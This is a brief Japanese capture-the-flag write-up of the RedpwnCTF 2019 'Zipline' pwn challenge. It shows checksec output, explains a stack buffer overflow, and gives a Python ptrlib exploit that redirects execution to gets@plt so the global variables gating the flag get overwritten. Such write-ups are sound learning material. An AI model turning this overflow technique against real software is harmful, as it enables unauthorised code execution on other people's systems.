# [pwn 50pts] Zipline - RedpwnCTF 2019
32ビットでNX以外無効です。
```
$ checksec -f zipline
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   104 Symbols     No      0               4       zipline
```
Stack Overflowがありますが、libcは配布されていません。
脆弱性のある関数のあとに特定の条件でフラグを読み込む関数があります。
グローバル変数aからhまでが0でなければフラグが読まれるので、getsでそこを埋めるようにすればOKです。
```python
from ptrlib import *

#sock = Process("./zipline")
sock = Socket("chall2.2019.redpwn.net", 4005)
elf = ELF("./zipline")

rop_pop_ebx = 0x08049021
plt_gets = 0x08049060

payload = b'A' * 0x16
payload += p32(plt_gets)
payload += p32(0x8049569)
payload += p32(elf.symbol("a"))
sock.sendlineafter("hell?", payload)

sock.sendline("A" * 0x8)

sock.interactive()
```

# 感想
フラグを読む部分を直接呼んでも良いと思います。